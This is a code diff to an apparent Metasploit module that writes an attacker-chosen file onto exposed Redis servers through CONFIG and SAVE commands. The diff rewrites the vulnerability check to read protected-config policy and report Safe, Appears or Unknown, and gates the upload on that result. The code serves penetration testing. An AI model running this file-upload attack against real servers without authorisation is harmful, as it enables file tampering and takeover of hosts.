@@ -122,18 +122,60 @@ class MetasploitModule < Msf::Auxiliary
     redis_command('SAVE')
   end
 
-  def check
+  def check_host(_ip)
     connect
-    # they are only vulnerable if we can run the CONFIG command, so try that
-    return Exploit::CheckCode::Safe('Redis CONFIG command is not accessible') unless (config_data = redis_command('CONFIG', 'GET', '*')) && config_data =~ /dbfilename/
+    config_data = redis_command('CONFIG', 'GET', 'dbfilename')
+    return Exploit::CheckCode::Unknown('Redis did not return its snapshot filename configuration') unless config_data
+    if config_data.start_with?('-ERR unknown command', '-NOPERM')
+      return Exploit::CheckCode::Safe('Redis snapshot filename configuration is not accessible')
+    end
 
-    if (info_data = redis_command('INFO')) && /redis_version:(?<redis_version>\S+)/ =~ info_data
+    filename_config = parse_config_reply(config_data)
+    return Exploit::CheckCode::Unknown('Redis returned an unexpected snapshot filename configuration') unless filename_config&.first == 'dbfilename'
+
+    if (info_data = redis_command('INFO', 'server')) && /redis_version:(?<redis_version>\S+)/ =~ info_data
       report_redis(redis_version)
     end
 
-    Exploit::CheckCode::Vulnerable('Redis CONFIG command is accessible and can be used for file upload')
+    protection_data = redis_command('CONFIG', 'GET', 'enable-protected-configs')
+    return Exploit::CheckCode::Unknown('Redis did not return its protected configuration policy') unless protection_data
+
+    protection_config = parse_config_reply(protection_data)
+    return Exploit::CheckCode::Unknown('Redis returned an unexpected protected configuration policy') unless protection_config
+
+    # Redis 7 protects dir and dbfilename even when CONFIG GET is allowed:
+    # https://github.com/redis/redis/blob/7.2/redis.conf#L105-L126
+    if protection_config == ['enable-protected-configs', 'no']
+      return Exploit::CheckCode::Safe('Redis protected configuration prevents changing dir and dbfilename')
+    end
+
+    if protection_config == ['enable-protected-configs', 'local']
+      return Exploit::CheckCode::Appears('Redis configuration is readable, but protected file settings require a local connection; file upload has not been verified')
+    end
+
+    # Older releases return an empty array for an unknown configuration name.
+    unless protection_config.empty? || protection_config == ['enable-protected-configs', 'yes']
+      return Exploit::CheckCode::Unknown('Redis returned an unrecognized protected configuration policy')
+    end
+
+    Exploit::CheckCode::Appears('Redis snapshot configuration is accessible; file upload has not been verified')
+  rescue Rex::ConnectionError, Errno::ECONNRESET, ::Timeout::Error, ::EOFError, Msf::Auxiliary::Failed => e
+    elog('Redis file-upload check failed', error: e)
+    Exploit::CheckCode::Unknown("Could not query Redis configuration: #{e.message}")
   ensure
     disconnect
+  end
+
+  def parse_config_reply(response)
+    return unless response.start_with?('*')
+
+    fields = parse_redis_response(response)
+    return fields if fields.is_a?(Array) && [0, 2].include?(fields.length) && fields.all? { |field| field.is_a?(String) }
+  rescue RuntimeError, NoMethodError => e
+    # The mixin parser raises RuntimeError for invalid types and NoMethodError
+    # when a truncated array ends before its next element.
+    elog('Could not parse Redis configuration response', error: e)
+    nil
   end
 
   def setup
@@ -158,10 +200,14 @@ class MetasploitModule < Msf::Auxiliary
     @upload_content = "\n#{File.read(datastore['LocalFile']).strip}\n" if datastore['LocalFile']
   end
 
-  def run_host(_ip)
-    fail_with(Failure::BadConfig, "LocalFile must be set") unless datastore['LocalFile']
-    fail_with(Failure::BadConfig, "RemoteFile must be set") unless datastore['RemoteFile']
-    return unless check == Exploit::CheckCode::Vulnerable
+  def run_host(ip)
+    fail_with(Failure::BadConfig, 'LocalFile must be set') unless datastore['LocalFile']
+    fail_with(Failure::BadConfig, 'RemoteFile must be set') unless datastore['RemoteFile']
+    result = check_host(ip)
+    unless result == Exploit::CheckCode::Appears
+      print_error("File upload is unavailable: #{result.reason}")
+      return
+    end
 
     begin
       connect
